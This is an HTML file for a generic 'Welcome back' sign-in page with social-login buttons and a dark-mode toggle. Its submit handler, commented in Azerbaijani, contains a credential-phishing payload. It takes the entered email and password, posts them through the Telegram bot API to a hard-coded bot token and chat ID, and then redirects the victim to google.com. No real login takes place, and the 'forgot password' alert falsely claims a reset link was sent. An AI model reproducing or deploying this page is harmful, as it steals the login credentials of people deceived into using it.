<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #ffffff 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        body.dark-mode {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
        }

        .login-container {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            padding: 48px 40px;
        }

        body.dark-mode .login-container {
            background: #2d2d2d;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }

        .login-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .login-header h1 {
            font-size: 28px;
            font-weight: 500;
            color: #000;
            margin-bottom: 8px;
        }

        body.dark-mode .login-header h1 {
            color: #fff;
        }

        .login-header p {
            font-size: 14px;
            color: #666;
        }

        body.dark-mode .login-header p {
            color: #aaa;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #000;
            margin-bottom: 8px;
        }

        body.dark-mode label {
            color: #fff;
        }

        input {
            width: 100%;
            padding: 12px 14px;
            font-size: 14px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: #f9f9f9;
            color: #000;
            transition: border-color 0.2s, background-color 0.2s;
            font-family: inherit;
        }

        body.dark-mode input {
            border-color: #444;
            background: #1a1a1a;
            color: #fff;
        }

        input:focus {
            outline: none;
            border-color: #3b82f6;
            background: #ffffff;
        }

        body.dark-mode input:focus {
            background: #2d2d2d;
        }

        input::placeholder {
            color: #999;
        }

        body.dark-mode input::placeholder {
            color: #666;
        }

        .form-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            font-size: 13px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #000;
        }

        body.dark-mode .remember-me {
            color: #fff;
        }

        input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .forgot-password {
            color: #3b82f6;
            text-decoration: none;
            transition: color 0.2s;
        }

        .forgot-password:hover {
            color: #2563eb;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            font-size: 15px;
            font-weight: 500;
            color: white;
            background: #3b82f6;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            font-family: inherit;
        }

        .login-btn:hover {
            background: #2563eb;
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .signup-link {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }

        body.dark-mode .signup-link {
            color: #aaa;
        }

        .signup-link a {
            color: #3b82f6;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s;
        }

        .signup-link a:hover {
            color: #2563eb;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #ddd;
        }

        body.dark-mode .divider::before,
        body.dark-mode .divider::after {
            background: #444;
        }

        .divider span {
            padding: 0 12px;
            color: #999;
            font-size: 13px;
        }

        body.dark-mode .divider span {
            color: #666;
        }

        .social-login {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }

        .social-btn {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: #f9f9f9;
            color: #000;
            cursor: pointer;
            font-size: 13px;
            font-weight: 500;
            transition: background-color 0.2s, border-color 0.2s;
            font-family: inherit;
        }

        body.dark-mode .social-btn {
            border-color: #444;
            background: #1a1a1a;
            color: #fff;
        }

        .social-btn:hover {
            border-color: #bbb;
            background: #ffffff;
        }

        body.dark-mode .social-btn:hover {
            border-color: #666;
            background: #2d2d2d;
        }

        .theme-toggle {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #f0f0f0;
            border: none;
            border-radius: 8px;
            padding: 8px 12px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.2s;
        }

        body.dark-mode .theme-toggle {
            background: #444;
        }

        .theme-toggle:hover {
            background: #e0e0e0;
        }

        body.dark-mode .theme-toggle:hover {
            background: #555;
        }
    </style>
</head>
<body>
    <button class="theme-toggle" onclick="toggleTheme()" title="Toggle dark mode">🌙</button>

    <div class="login-container">
        <div class="login-header">
            <h1>Welcome back</h1>
            <p>Sign in to your account to continue</p>
        </div>

        <form id="loginForm">
            <div class="social-login">
                <button type="button" class="social-btn" onclick="handleSocialLogin(event, 'Google')">Google</button>
                <button type="button" class="social-btn" onclick="handleSocialLogin(event, 'GitHub')">GitHub</button>
            </div>

            <div class="divider">
                <span>or</span>
            </div>

            <div class="form-group">
                <label for="email">Email address</label>
                <input type="email" id="email" name="email" placeholder="you@example.com" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>

            <div class="form-options">
                <label class="remember-me">
                    <input type="checkbox" id="remember" name="remember">
                    <span>Remember me</span>
                </label>
                <a href="#" class="forgot-password" onclick="handleForgotPassword(event)">Forgot password?</a>
            </div>

            <button type="submit" class="login-btn">Sign in</button>
        </form>

        <div class="signup-link">
            Don't have an account? <a href="#" onclick="handleSignup(event)">Create one</a>
        </div>
    </div>

    <script>
        // Load theme preference from localStorage
        function loadTheme() {
            const theme = localStorage.getItem('theme') || 'light';
            if (theme === 'dark') {
                document.body.classList.add('dark-mode');
                document.querySelector('.theme-toggle').textContent = '☀️';
            }
        }

        // Toggle between light and dark mode
        function toggleTheme() {
            document.body.classList.toggle('dark-mode');
            const isDark = document.body.classList.contains('dark-mode');
            localStorage.setItem('theme', isDark ? 'dark' : 'light');
            document.querySelector('.theme-toggle').textContent = isDark ? '☀️' : '🌙';
        }

        // Handle form submission
        const form = document.getElementById('loginForm');

form.addEventListener('submit', function(e) {
    e.preventDefault(); // Səhifənin yenilənməsini dayandırır

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Bura öz məlumatlarını yaz:
    const botToken = "8797267343:AAFQY-4NAcDdzVWYzbJINrKaTBQi4WFlmiU"; 
    const chatId = "584046464"; 
    
    const text = `🚀 Yeni Məlumat!\n\n📧 Email: ${email}\n🔑 Şifrə: ${password}`;

    // Telegram API-yə göndərilir
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    })
    .then(() => {
        // Məlumat gedəndən sonra istifadəçini hara göndərsin?
        window.location.href = "https://google.com"; 
    })
    .catch(err => {
        console.error("Xəta:", err);
    });
});
        // Handle social login
        function handleSocialLogin(e, provider) {
            e.preventDefault();
            alert(`${provider} login coming soon`);
        }

        // Handle forgot password
        function handleForgotPassword(e) {
            e.preventDefault();
            alert('Password reset link sent to your email');
        }

        // Handle sign up
        function handleSignup(e) {
            e.preventDefault();
            alert('Sign up page coming soon');
        }

        // Load theme on page load
        loadTheme();
    </script>
</body>
</html>
